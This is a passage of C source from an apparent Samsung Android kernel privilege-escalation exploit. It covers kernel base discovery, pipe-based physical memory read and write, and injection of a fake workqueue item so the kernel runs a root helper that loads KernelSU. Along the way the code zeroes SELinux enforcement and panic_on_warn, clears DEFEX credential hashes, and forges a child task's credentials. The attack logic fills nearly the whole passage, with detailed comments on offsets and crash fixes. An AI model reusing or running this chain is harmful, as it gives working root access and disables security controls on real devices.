             0xa8000000ULL + (unsigned long long)g_slide, (int)nfixed);

        for (idx = 0; idx < total && !found; idx++)
        {
            unsigned long long cand_phys;

            if (idx == 0)
                cand_phys = 0xa8000000ULL + (unsigned long long)g_slide;
            else if (idx <= nfixed)
                cand_phys = cands[idx - 1];
            else
                cand_phys = cands[idx - nfixed - 1] +
                            (unsigned long long)g_slide;

            {
                /*
                 * Strong signature first: linux_banner is a .rodata string at
                 * a fixed offset in the image, so a candidate base is correct
                 * only if 13 bytes there read "Linux version".  Testing the
                 * wq slot first gave false positives (a stale pointer-looking
                 * value) and hid the real base.
                 */
                /*
                 * g_kimage_phys has to be set *before* the alias is computed:
                 * leaving it for after the gate made every candidate read the
                 * previous iteration's alias (phys 0 on the first pass), which
                 * is what produced the flood of "read outside DRAM:
                 * 0xffffff7f82011aa0" and an empty scan.
                 */
                g_kimage_phys = cand_phys;
                {
                    char ban[16];

                    if (user_pipe_read(pf[0], mark,
                                       alias_of_kimg(LINUX_BANNER_STATIC), ban,
                                       13) != 13 ||
                        memcmp(ban, "Linux version", 13))
                        continue;
                }
                logf("[+] image phys base = %#llx (linux_banner)\n", cand_phys);
                sym_alias = alias_of_kimg(SYSTEM_UNBOUND_WQ_STATIC);
                if (user_pipe_read(pf[0], mark, sym_alias, &wq, 8) != 8)
                    continue;
                if (wq < g_linear_lo || wq >= g_base + g_linear_span)
                    continue;
                logf("[+] umh phys-cand %#llx -> wq=%#llx\n", cand_phys,
                     wq);
                if (wq < g_base || wq >= 0xffffffc000000000ULL)
                    continue;
                /*
                 * A wrong physical load usually lands in .rodata and still
                 * yields a linear pointer (a string pointer).  Validate the
                 * object as a workqueue_struct: name[24] at +0xc0 must be
                 * printable and contain "unbound", and a pwq pointer must
                 * point back to wq.
                 */
                if (user_pipe_read(pf[0], mark, wq, kb, 0x200) != 0x200)
                    continue;
                {
                    /*
                     * workqueue_struct carries either an inline char[24] or a
                     * const char * depending on the build, and the .BTF
                     * section is not present in this vmlinux.elf, so accept
                     * both: search the 0x200 bytes for the string first, then
                     * treat +0xc0 as a pointer.  Log which one hit, so the
                     * layout stops being a guess.
                     */
                    char nm[32] = {0};
                    int nm_ok = 0, nm_off = -1;

                    for (int o = 0; o + 15 <= 0x200; o++)
                        if (!memcmp(kb + o, "events_unbound", 14))
                        {
                            memcpy(nm, kb + o, 24);
                            nm_ok = 1;
                            nm_off = o;
                            break;
                        }
                    if (!nm_ok)
                    {
                        unsigned long long np =
                            *(unsigned long long *)(kb + 0xc0);

                        if (np >= g_linear_lo && np < g_base + g_linear_span &&
                            user_pipe_read(pf[0], mark, np, nm, 24) == 24 &&
                            strstr(nm, "unbound"))
                        {
                            nm_ok = 1;
                            nm_off = -2;
                        }
                    }
                    if (!nm_ok)
                    {
                        logf("[+] umh cand %#llx rejected (no name)\n",
                             cand_phys);
                        continue;
                    }
                    logf("[+] umh cand %#llx name=%.24s (via %d)\n", cand_phys,
                         nm, nm_off);
                }
                found = 1;
            }
        }
        if (!found)
            park_forever("umh bad wq (no kernel phys candidate matched)");
    }
    logf("[+] umh wq=%#llx (kimage_phys=%#llx)\n", wq, g_kimage_phys);
    if (user_pipe_read(pf[0], mark, wq, kb, 0x200) != 0x200)
        park_forever("umh wq page read failed");
    /*
     * Locate dfl_pwq at runtime instead of trusting one BTF offset: the
     * running Samsung config can shift workqueue_struct fields by a word.
     * Only accept a candidate whose pool_workqueue->wq points back to wq.
     */
    pwq = 0;
    {
        unsigned char kb2[0x100];
        int pwq_off = -1;

        for (int o = 0x90; o <= 0x138; o += 8)
        {
            unsigned long long cp = *(unsigned long long *)(kb + o);
            ssize_t rn;

            logf("[+] umh wq[%#x]=%#llx\n", o, cp);
            if (cp < g_base || cp >= 0xffffffc000000000ULL)
                continue;
            rn = user_pipe_read(pf[0], mark, cp, kb2, 0x100);
            if (rn != 0x100)
            {
                logf("[+] umh wq[%#x] read n=%zd\n", o, rn);
                continue;
            }
            logf("[+] umh pwq cand off=%#x ptr=%#llx pool=%#llx wq=%#llx\n",
                 o, cp, *(unsigned long long *)kb2,
                 *(unsigned long long *)(kb2 + 8));
            if (*(unsigned long long *)(kb2 + 8) == wq)
            {
                pwq = cp;
                pwq_off = o;
                memcpy(kb, kb2, sizeof(kb2));
                break;
            }
        }
        if (!pwq)
            park_forever("umh pwq->wq mismatch");
        logf("[+] umh pwq=%#llx (dfl_pwq off %#x)\n", pwq, pwq_off);
    }
    pool = *(unsigned long long *)(kb + PWQ_POOL_OFF);
    val = *(unsigned long long *)(kb + PWQ_WQ_OFF);
    if (val != wq)
        park_forever("umh pwq->wq mismatch");
    logf("[+] umh pool=%#llx\n", pool);
    if (pool < g_base || pool >= 0xffffffc000000000ULL)
        park_forever("umh bad pool");
    /*
     * Publish only into an idle pool: the worklist has to be empty (so the
     * 16-byte publish starts from a known state) and at least one worker
     * has to be idle, because our direct list insertion never calls
     * wake_up_worker().  When the pool is busy or has no idle worker, kick
     * it with a pty pair: the tty hangup work still goes through
     * __queue_work(), which either wakes an idle worker or creates one,
     * and the next iteration sees the settled state.
     */
    for (int t = 0; t < 12; t++)
    {
        if (user_pipe_read(pf[0], mark, pool, kb, 0x80) != 0x80)
            park_forever("umh pool page read failed");
        wl_next = *(unsigned long long *)(kb + POOL_WORKLIST_OFF);
        wl_prev = *(unsigned long long *)(kb + POOL_WORKLIST_OFF + 8);
        nw = *(unsigned int *)(kb + POOL_NR_WORKERS_OFF);
        ni = *(unsigned int *)(kb + POOL_NR_IDLE_OFF);
        if (wl_next == pool + POOL_WORKLIST_OFF &&
            wl_prev == pool + POOL_WORKLIST_OFF && ni > 0)
            break;
        logf("[+] umh pool busy t=%d next=%#llx prev=%#llx "
             "workers=%u idle=%u\n", t, wl_next, wl_prev, nw, ni);
        (void)wake_system_unbound();
        usleep(150000);
    }
    logf("[+] umh worklist next=%#llx prev=%#llx workers=%u idle=%u\n",
         wl_next, wl_prev, nw, ni);
    if (wl_next != pool + POOL_WORKLIST_OFF ||
        wl_prev != pool + POOL_WORKLIST_OFF || ni == 0)
        park_forever("umh pool busy");

    if (g_umh_dry)
    {
        /* Detach held victims while the pipe physrw still points at the
         * fake array; restoring pipe->bufs first makes the next pipe read
         * hit an empty normal pipe (EAGAIN). */
        safe_unlink_held();
        g_safe_done = 1;
        /* Restore pipe->bufs (and clear our slots' ops) before parking:
         * nothing else will. */
        pipe_restore();
        logf("[+] UMH_DRY_READY wq=%#llx pwq=%#llx pool=%#llx\n",
             wq, pwq, pool);
        park_forever("umh dry run -- offsets validated, not injecting");
    }

    if (access(ROOT_UMH_PATH, X_OK) != 0)
        park_forever("umh helper " ROOT_UMH_PATH
                     " missing (stage it first)");
    /*
     * Injection (s928b reference design): the fake work's data points at a
     * fake pool_workqueue in the user page, so the worker's pwq bookkeeping
     * never touches the real pwq counters (the real-pwq variant raced a
     * concurrent queue_work and crashed).  The list publish is a single
     * 16-byte write of both pointers, so a worker never observes a
     * half-linked node.  Everything the kernel follows is a linear address;
     * the bytes themselves live in our user page.
     */
    unsigned long long pub_entry = 0, pub_worklist = 0;
    {
        /* work_struct at +0x300, clear of the fake pipe_buffer slot region
         * (0x28..0x280) that user_buf_set rewrites on every pipe op.  The
         * s928b reference puts it at +0x100, but that only works because its
         * user_buf_set fills a single slot; ours fills 1..15, so +0x100 got
         * clobbered and a later fsync-triggered __queue_work walked a
         * half-linked list (list_add corruption). */
        unsigned long long work = mark_va + 0x300;
        unsigned long long entry = work + WORK_ENTRY_OFF;
        unsigned long long data = mark_va + ROOT_UMH_DATA_OFF;
        unsigned long long worklist = pool + POOL_WORKLIST_OFF;
        struct umh_kernel_data ud;
        unsigned long long *w, *p;
        unsigned long long fake_pwq = mark_va + ROOT_UMH_PWQ_OFF;
        unsigned char zero = 0;
        int sn, wn = 0;

        /*
         * Fake pool_workqueue in the user page (s928b reference design):
         * work->data points here, so the worker's post-func pwq bookkeeping
         * (dec nr_in_flight, inactive_works, pwqs_node, mayday_node) stays
         * off the real pwq.  The earlier real-pwq variant incremented the
         * real pwq counters, which races a concurrent real queue_work and
         * can drive nr_active/nr_in_flight negative -- the crash seen right
         * after "counters written".  Offsets are this kernel's BTF: pool 0,
         * wq 8, work_color 0x10, refcnt 0x18, nr_in_flight[16] 0x1c,
         * nr_active 0x5c, max_active 0x60, inactive_works 0x68, pwqs_node
         * 0x78, mayday_node 0x88.
         */
        p = (unsigned long long *)((unsigned char *)mark + ROOT_UMH_PWQ_OFF);
        memset(p, 0, 0x80);
        p[PWQ_POOL_OFF / 8] = pool;
        p[PWQ_WQ_OFF / 8] = wq;
        *(unsigned int *)((unsigned char *)p + PWQ_WORK_COLOR_OFF) = 1;
        *(unsigned int *)((unsigned char *)p + PWQ_REFCNT_OFF) = 2;
        *(unsigned int *)((unsigned char *)p + PWQ_NR_IN_FLIGHT_OFF + 4) = 1;
        *(unsigned int *)((unsigned char *)p + PWQ_NR_ACTIVE_OFF) = 1;
        *(unsigned int *)((unsigned char *)p + PWQ_MAX_ACTIVE_OFF) = 8;
        /* Self-referential (empty) list heads so the worker's list_del /
         * list_empty on the fake pwq terminates instead of chasing a zero
         * pointer. */
        *(unsigned long long *)((unsigned char *)p + 0x68) = fake_pwq + 0x68;
        *(unsigned long long *)((unsigned char *)p + 0x70) = fake_pwq + 0x68;
        *(unsigned long long *)((unsigned char *)p + 0x78) = fake_pwq + 0x78;
        *(unsigned long long *)((unsigned char *)p + 0x80) = fake_pwq + 0x78;
        *(unsigned long long *)((unsigned char *)p + 0x88) = fake_pwq + 0x88;
        *(unsigned long long *)((unsigned char *)p + 0x90) = fake_pwq + 0x88;
        logf("[+] umh fake pwq=%#llx pool=%#llx wq=%#llx\n", fake_pwq, pool,
             wq);

        memset(&ud, 0, sizeof(ud));
        snprintf(ud.path, sizeof(ud.path), "%s", ROOT_UMH_PATH);
        snprintf(ud.path + 16, sizeof(ud.path) - 16, "%s",
                 ROOT_UMH_ARG);
        snprintf(ud.uid, sizeof(ud.uid), "%u", (unsigned)getuid());
        {
            unsigned long long completion_addr =
                data + __builtin_offsetof(struct umh_kernel_data,
                                          completion);
            unsigned long long path_addr =
                data + __builtin_offsetof(struct umh_kernel_data, path);

            ud.completion.next = completion_addr +
                __builtin_offsetof(struct umh_completion, next);
            ud.completion.prev = ud.completion.next;
            ud.argv[0] = path_addr;
            ud.argv[1] = path_addr + 16;
            ud.argv[2] = 0;
            ud.argv[3] = 0;
            ud.envp[0] = 0;
        }
        memcpy((unsigned char *)mark + ROOT_UMH_DATA_OFF, &ud,
               sizeof(ud));
        /*
         * Fill the work_struct / subprocess_info NOW, before any pipe op:
         * at +0x300 it is clear of the user_buf_set slot region (0x28..0x280)
         * so nothing clobbers it, and entry.next == entry.prev == worklist
         * makes the list fully self-consistent the moment it is published.
         * A concurrent __queue_work (an fsync from logf, block I/O, the pty
         * kick) then list_add_tail's cleanly onto it instead of tripping
         * list_add corruption.
         */
        w = (unsigned long long *)((unsigned char *)mark + 0x300);
        memset(w, 0, 0x70);
        w[0] = fake_pwq | 0x15; /* pwq | color(1)<<4 | PENDING | PWQ */
        w[1] = worklist;
        w[2] = worklist;
        w[3] = UMH_EXEC_WORK_STATIC + g_slide; /* func */
        w[6] = data + __builtin_offsetof(struct umh_kernel_data,
                                         completion);
        w[7] = data + __builtin_offsetof(struct umh_kernel_data, path);
        w[8] = data + __builtin_offsetof(struct umh_kernel_data, argv);
        w[9] = data + __builtin_offsetof(struct umh_kernel_data, envp);
        *(int *)((unsigned char *)w + 48 + 32) = 0; /* wait = UMH_NO_WAIT */

        /*
         * Deterministic panic_on_warn = 0, through the now-verified pipe.
         * The stage-1 pre-plant is probabilistic and cannot be read back as
         * shell (the sysctl is root-only on Samsung builds), so if it
         * silently missed, panic_on_warn stays 1 and any WARN later in the
         * chain -- e.g. timerqueue_del's WARN_ON_ONCE(RB_EMPTY_NODE) or a
         * workqueue warning -- panics the device.  The pipe write needs no
         * plant and its read-back is exact, so from here on every WARN is a
         * log line, not a reboot.
         */
        {
            unsigned char pw0 = 0, pwrb = 0xff;

            if (user_pipe_write(pf[1], mark,
                                PANIC_ON_WARN_STATIC + g_slide, &pw0, 1) != 1 ||
                user_pipe_read(pf[0], mark,
                               PANIC_ON_WARN_STATIC + g_slide, &pwrb, 1) != 1)
                logf("[!] umh panic_on_warn pipe write/readback failed\n");
            else
                logf("[+] umh panic_on_warn=%u (pipe, deterministic)\n",
                     (unsigned)pwrb);
        }

        /*
         * SELinux permissive for the helper's late-load: a precise one
         * byte zero of selinux_state.enforcing -- initialized (+2) is
         * never touched.  Verified from userspace right after.
         */
        {
            char enf[8] = "?";
            int efd;

            efd = open("/sys/fs/selinux/enforce", O_RDONLY);
            if (efd >= 0)
            {
                (void)read(efd, enf, sizeof(enf) - 1);
                close(efd);
            }
            logf("[+] umh enforce before=%c\n", enf[0]);
        }
        sn = user_pipe_write(pf[1], mark,
                             SELINUX_STATE_STATIC + g_slide, &zero, 1);
        {
            char enf[8] = "?";
            int efd;

            efd = open("/sys/fs/selinux/enforce", O_RDONLY);
            if (efd >= 0)
            {
                (void)read(efd, enf, sizeof(enf) - 1);
                close(efd);
            }
            logf("[+] umh selinux write n=%d enforce now=%c\n", sn,
                 enf[0]);
        }

        /* __queue_work-equivalent accounting lives in the fake pwq, so the
         * real pwq counters are never touched. */
        pub_entry = entry;
        pub_worklist = worklist;

        /*
         * Publish both list pointers in one 16-byte pipe write.  The old
         * prev-first/check/next sequence leaves a window where
         * head->prev = entry but head->next = head; a concurrent real
         * queue_work (pty hangup etc.) then builds a half-linked list and
         * the next __list_add_valid panics (observed: __list_add_valid+0x).
         * A single 16-byte store makes the empty-list transition atomic
         * from the list's point of view; the worst race outcome is an
         * orphaned real work, not list corruption.
         */
        {
            unsigned long long pair[2] = {entry, entry};

            logf("[+] umh publish worklist=%#llx entry=%#llx (16B write)\n",
                 worklist, entry);
            wn += user_pipe_write(pf[1], mark, worklist, pair, 16);
        }
        {
            unsigned long long wl_next = 0;

            (void)user_pipe_read(pf[0], mark, worklist, &wl_next, 8);
            logf("[+] umh published? worklist.next=%#llx (want %#llx)\n",
                 wl_next, entry);
        }
        logf("[+] umh user work=%#llx entry=%#llx data=%#llx "
             "func=%#llx wl=%#llx publish=%d\n",
             work, entry, data, UMH_EXEC_WORK_STATIC + g_slide,
             worklist, wn);
    }
    /*
     * Wake an idle pool worker: opening and closing a pty pair queues tty
     * hangup works on system_unbound_wq (the reference kick), which wakes
     * a worker that then processes our linked item.
     */
    for (int round = 0; round < 8 && !ready; round++)
    {
        int wk = wake_system_unbound();

        if (round < 2 || wk == 0)
            logf("[+] umh wake round=%d pty=%d\n", round, wk);
        for (int j = 0; j < 250; j++)
        {
            if (access("/data/local/tmp/samtimer/umh-action.log", F_OK) == 0)
            {
                ready = 1;
                break;
            }
            usleep(40000);
        }
    }
    logf(ready ? "UMHPIPE_STARTED\n" : "UMHPIPE_MISSING\n");
    {
        /* Diagnostics read straight from our own mapping: the kernel
         * writes sub_info->retval (+0x54) and completion.done (+0x800)
         * through the linear alias of this very page, and the page is
         * ours to read -- no pipe primitive needed (which may have been
         * clobbered by then). */
        int rv = *(int *)(mark + 0x354);
        unsigned int done = *(unsigned int *)(mark + 0x800);
        unsigned long long fb0 = *(unsigned long long *)(mark + 0x28);
        unsigned long long fb2 = *(unsigned long long *)(mark + 0x38);

        logf("[+] umh sub_info retval=%d completion.done=%u\n", rv, done);
        logf("[+] umh fake buf page=%#llx off/len=%#llx\n", fb0, fb2);
        logf("[+] umh work data=%#llx next=%#llx prev=%#llx func=%#llx\n",
             *(unsigned long long *)(mark + 0x300),
             *(unsigned long long *)(mark + 0x308),
             *(unsigned long long *)(mark + 0x310),
             *(unsigned long long *)(mark + 0x318));
    }
    if (!ready && pub_entry)
    {
        /*
         * The work may still be linked in the pool worklist.  Exiting
         * with it linked is a guaranteed panic: our user page goes away
         * and the next worker to touch the pool walks freed memory.
         * Unlink it with a proper list_del (other works may sit behind
         * it).
         */
        unsigned long long cur = 0, nxt = 0, prv = 0;

        if (user_pipe_read(pf[0], mark, pub_worklist, &cur, 8) == 8 &&
            cur == pub_entry)
        {
            nxt = *(unsigned long long *)(mark + 0x308);
            prv = *(unsigned long long *)(mark + 0x310);
            /* next->prev = prev; prev->next = next */
            user_pipe_write(pf[1], mark, nxt + 8, &prv, 8);
            user_pipe_write(pf[1], mark, prv, &nxt, 8);
            logf("[+] umh work unlinked next=%#llx prev=%#llx\n", nxt, prv);
        }
        else
            logf("[+] umh work already consumed (list next=%#llx)\n", cur);
    }
    /*
     * Detach held victims before the physrw is torn down, then restore the
     * original pipe-buffer array so a later process teardown frees a valid
     * kmalloc object instead of the user page.
     */
    safe_unlink_held();
    g_safe_done = 1;
    pipe_restore();

    /* The helper (real root cred) runs the stage script; wait for it. */
    {
        int ksu_ok = 0;

        for (int i = 0; i < 200; i++)
        {
            FILE *mf = fopen("/proc/modules", "r");
            char line[256];

            ksu_ok = 0;
            if (mf)
            {
                while (fgets(line, sizeof(line), mf))
                    if (!strncmp(line, "kernelsu", 8))
                        ksu_ok = 1;
                fclose(mf);
            }
            if (ksu_ok)
                break;
            usleep(100000);
        }
        if (ksu_ok)
        {
            logf("KSU_LOADED\n");
            /*
             * /proc/modules only proves the module was inserted.  TimerRoot
             * reports state from what is actually live (su -c id / context)
             * for the same reason: the driver can be listed yet unusable.
             * KSU_GET_INFO over the reboot-backdoor fd is this chain's
             * equivalent, so report it next to the module state.
             */
            if (verify_ksu_control() == 0)
                logf("KSU_CONTROL_OK\n");
            else
                logf("KSU_CONTROL_FAIL\n");
        }
        else
            logf("KSU_MISSING\n");
    }
    logf("[+] umhpipe done held=%d ready=%d\n", g_held, ready);
    if (g_held)
        park_forever("zombies held");
    if (!ready && pub_entry)
        park_forever("umh work pending -- holding the page (do not kill)");
    return 0;
}

/*
 * A parked holder (park_forever() renames itself to "ksuhelperd") keeps a
 * failed-plant zombie whose stale timerqueue node lives in a page the
 * allocator has already handed out again.  Planting on top of it is how
 * this exploit turns one miss into a panic, so refuse to start while one
 * exists and tell the operator to reboot -- that is the documented
 * one-attempt-per-boot rule, enforced instead of assumed.
 */
static int previous_holder(void)
{
    DIR *d = opendir("/proc");
    struct dirent *de;
    int self = (int)getpid();
    int found = 0;

    if (!d)
        return 0;
    while (!found && (de = readdir(d)) != NULL)
    {
        char path[64], comm[32];
        int fd, n;
        int pid;

        if (de->d_name[0] < '0' || de->d_name[0] > '9')
            continue;
        pid = atoi(de->d_name);
        if (pid == self)
            continue;
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        fd = open(path, O_RDONLY);
        if (fd < 0)
            continue;
        n = (int)read(fd, comm, sizeof(comm) - 1);
        close(fd);
        if (n <= 0)
            continue;
        comm[n] = 0;
        if (!strncmp(comm, "ksuhelperd", 10))
            found = pid;
    }
    closedir(d);
    /*
     * Test-only escape hatch: a fresh run creates its own task and therefore
     * its own CPU-timer queues, so an older parked holder's stale node is not
     * in the tree this run walks.  Used only while verifying the write
     * primitive, never on a production path.
     */
    if (found && getenv("SAMTIMER_ALLOW_PARKED"))
    {
        logf("[!] ignoring parked holder pid=%d (SAMTIMER_ALLOW_PARKED)\n",
             found);
        return 0;
    }
    if (found)
        logf("[!] parked holder pid=%d (ksuhelperd) is still alive: a "
             "previous run left a failed-plant zombie.\n"
             "    Rebooting is the only safe way to clear it; refusing to "
             "plant on top of it.\n", found);
    return found;
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0, probe_only = 0;
    int umhpipe_mode = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    g_dump_pfn = getenv("SAMTIMER_DUMP_PFN") != NULL;
    /*
     * Detach from the caller's session/process group immediately: when the
     * Shizuku UserService that spawned us is torn down it kills its process
     * group, and our death would let init reap the held zombies (stale
     * timer nodes) -- a guaranteed kernel panic.  From our own session only
     * a direct kill or reboot can end us.
     */
    (void)setsid();
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");
    if (argc > 1 && !strcmp(argv[1], "setshell"))
        return setshell_main(argc > 2 ? argv[2] : "shell");
    if (argc > 1 && !strcmp(argv[1], "setksu"))
        return setksu_main();
    if (argc > 1 && !strcmp(argv[1], "--umh"))
        return setksu_main();

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
    if (argc > 1 && !strcmp(argv[1], "probe"))
        probe_only = 1;
    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;
    if (argc > 1 && !strcmp(argv[1], "pipefake"))
    {
        g_fake_stage = 1;
        g_pipe_fake = 1;
    }
    if (argc > 1 && !strcmp(argv[1], "umh"))
        g_umh_stage = 1;
    if (argc > 1 && !strcmp(argv[1], "umhpipe"))
        umhpipe_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "umhread"))
    {
        umhpipe_mode = 1;
        g_umh_dry = 1;
    }

    /*
     * Every pfn computation here (order-1 slab masks, vmemmap index, the
     * 8 KiB payload layout) hard-codes 4 KiB pages.  On a 16 KiB-page device
     * the writes would land on the wrong objects, so refuse instead of
     * corrupting memory (TimerRoot's troubleshooting: a porting job, not a
     * setting).
     */
    if (!ids_only && !probe_only && sysconf(_SC_PAGESIZE) != (long)PAGE)
    {
        logf("[-] page size %ld != %lu: this port assumes 4 KiB pages\n",
             (long)sysconf(_SC_PAGESIZE), (unsigned long)PAGE);
        return 1;
    }
    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    /* `ids` and `leak` never plant, so they stay usable for diagnostics even
     * while a previous holder is parked. */
    if (!ids_only && !leak_only && !probe_only && previous_holder())
        return 2;

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    enable_events();
    kick_rss();
    usleep(50000);

    {
        int disc_ok = 0;

        for (int t = 0; t < 3 && !disc_ok; t++)
        {
            if (discover_page_types(raw) == 0)
                disc_ok = 1;
            else
                logf("[-] page type discovery retry %d\n", t + 1);
        }
        if (!disc_ok)
            return 1;
    }
    if (ids_only)
        return 0;
    if (probe_only)
        return probe_main(raw);

    /*
     * dm2q / S9160: VA_BITS=39 PAGE_OFFSET 0xffffff8000000000 and memstart
     * 0x80000000 give a fixed linear-map base independent of KASLR.  The
     * trace-based calibration can pair a timer allocation with the wrong
     * order-1 page and produce a plausible-looking but wrong base (observed
     * 0xffffff7681b4a000), which then makes mark_va point at an unrelated
     * page.  Trust the platform constant; keep the calibration only as a
     * diagnostic when it agrees.
     */
    {
        unsigned long long cal = calibrate_base(raw);

        g_base = 0xffffff7f80000000ULL;
        if (cal != g_base)
            logf("[base] calibration=%#llx; using platform default %#llx\n",
                 cal, g_base);
        else
            logf("[base] calibration confirms %#llx\n", g_base);
    {
        FILE *mf = fopen("/proc/meminfo", "r");
        char line[128];
        unsigned long long kb = 0;

        if (mf)
        {
            while (fgets(line, sizeof(line), mf))
                if (sscanf(line, "MemTotal: %llu kB", &kb) == 1)
                    break;
            fclose(mf);
        }
        /*
         * MemTotal excludes reserved memory, so add 1 GiB of margin: on this
         * phone that is ~7.9 GiB, just inside the 8 GiB of DRAM.  The low
         * end starts at PAGE_OFFSET (g_base + memstart) because the linear
         * map is not backed between g_base and there either.
         */
        /*
         * 64 GiB, not MemTotal + 1 GiB.  A previous session on this device
         * measured pfn 0x8c4859 and 0xfc96e as legal to read, i.e. the linear
         * map is backed well past the 8 GiB of DRAM, and clamping to MemTotal
         * excluded the kernel image itself (its physical load is
         * 0xa8000000 + slide, and the alias of a .data symbol lands near it).
         * MemTotal is logged for context only.
         */
        (void)kb;
        g_linear_span = 64ULL << 30;
        g_linear_lo = g_base + 0x80000000ULL;
        logf("[base] linear window = %#llx (%llu MiB), MemTotal=%llu MiB\n",
             g_linear_span, g_linear_span >> 20, kb >> 10);
    }
    }
    prefill_timers(PREFILL_TIMERS);

    /* The umhpipe chain is self-contained: no child cred leak is needed,
     * the KASLR slide comes from the plant's own trace sites. */
    if (umhpipe_mode)
    {
        int rc = umhpipe_main(raw);

        free(raw);
        return rc;
    }

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        if (g_held)
            park_forever("cred leak failed; zombies held");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + CRED_UID_OFF);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        if (g_held)
            park_forever("leak-only done; zombies held");
        return 0;
    }
    if (g_fake_stage)
        write_ksu_script();
    ensure_pool();
    ensure_raw();
    drain_timers();
    if (g_pipe_fake)
    {
        g_child_pid = (int)C;
        g_child_go_fd = go_fd;
        (void)umhpipe_main(raw);
        return 0;
    }

    if (!g_fake_stage)
    {
        struct plant_res r;
        memset(&r, 0, sizeof(r));
        /*
         * timer shell: also make SELinux permissive for the shell.  A
         * shell-domain root cannot write /sys/fs/selinux/enforce (policy
         * denies it), so clear selinux_state.enforcing with one zero
         * plant before waking the child.
         */
        if (shell_mode)
        {
            if (stage_write(0, 0, "selinux", raw, NULL,
                            SELINUX_ENFORCE_ZAP))
                park_forever("selinux write failed");
            logf("[+] selinux_state.enforcing cleared (permissive until "
                 "reboot)\n");
            /*
             * Android sets SECURE_NOROOT in securebits; with it set the
             * euid=0 exec never re-grants the bset, so the shell has no
             * CAP_SETGID and cannot add the /data groups.  Clear
             * securebits on the child's real cred.
             */
            if (stage_write(R + CRED_SECUREBITS_OFF, 0, "securebits",
                            raw, NULL, 0))
                park_forever("securebits write failed");
            logf("[+] real cred securebits cleared (SECURE_NOROOT off)\n");
        }
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw, 0);
        }
        if (!r.ok)
            park_forever("no successful plant");
        /*
         * Samsung DEFEX compares the task's uid to creds_hash[pid] when it
         * execs.  The zero-write path has no fake cred to hide behind, so
         * clear the bucket for the child's pid exactly like the fake path
         * does; otherwise the shell's exec is caught even though the live
         * ro-cred uid is 0.  Honor (no DEFEX) does not need this step.
         */
        if (stage_write(0, 0, "defex_hash", raw, NULL,
                        CREDS_FAST_HASH_STATIC +
                            ((unsigned long long)C << 3)))
            park_forever("defex hash clear failed");
        logf("[+] DEFEX creds_hash[%d] cleared\n", C);
    }
    else if (g_umh_stage)
    {
        /*
         * UMH injection stage (fusion-s24u flow): make SELinux permissive
         * and set the DEFEX enforce gate, then link a fake work_struct
         * (func = call_usermodehelper_exec_work, subprocess_info fully
         * inside the reclaimed page) into the system_unbound_wq pool
         * worklist.  The kernel spawns ROOT_UMH_PATH as a legitimate root
         * usermodehelper -- no cred forgery, so DEFEX never triggers.
         */
        if (!g_slide_set)
            park_forever("no KASLR slide");
        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_ENFORCE_ZAP))
            park_forever("selinux write failed");
        logf("[+] selinux permissive\n");
        {
            struct plant_res r;

            if (run_plant_once(CREDS_FAST_HASH_STATIC +
                                   (unsigned long long)getpid() * 8,
                               raw, &r))
                park_forever("defex hash clear failed");
        }
        logf("[+] DEFEX enforce gate set\n");
        /*
         * The pool worklist address is wq->dfl_pwq->pool->worklist, which
         * needs a read primitive we do not have.  Stub: this stage parks
         * until the pwq/pool leak (kmem trace on the alloc_workqueue
         * callsite) is wired up.
         */
        park_forever("umh stage: pool leak not wired yet");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        /*
         * The fake erase has to use the self-parent node (RB_EMPTY_NODE)
         * so that rb_next() returns NULL and the posix-cpu-timers exit
         * loop stops.  That takes timerqueue_del()'s WARN_ON_ONCE.  Zero
         * panic_on_warn first with a plain zero plant so the WARN cannot
         * turn into a reboot.
         */
        if (stage_write(0, 0, "panic_on_warn", raw, NULL,
                        PANIC_ON_WARN_STATIC))
            park_forever("panic_on_warn pre-plant failed");
        /*
         * Clear the child's DEFEX stored-credential slot before the wake:
         * task_defex_check_creds() reads creds_hash[child_pid] and compares
         * the stored uid against the forged one; a zero entry matches uid 0
         * and the check passes ("mov w0, wzr; ret" path).
         */
        if (stage_write(0, 0, "defex_hash", raw, NULL,
                        CREDS_FAST_HASH_STATIC +
                            (unsigned long long)C * 8))
            park_forever("defex hash clear failed");
        logf("[+] DEFEX creds_hash[%d] cleared\n", C);
        /*
         * Point task->cred at the reclaimed node.  parent_color == node
         * makes rb_erase write the node address into task->cred; the
         * erase dirties uid (parent color high half), gid/suid
         * (__rb_change_child target) and sgid/euid (rb_left target).
         * The two zero plants below repair uid/gid and euid/egid.
         */
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc, 0))
            park_forever("fake cred write failed");
        /* From here the child's task->cred points into the fake pool page. */
        g_cred_live = 1;
        /* A genuine slide of 0 is valid (64KB-granular KASLR can draw 0);
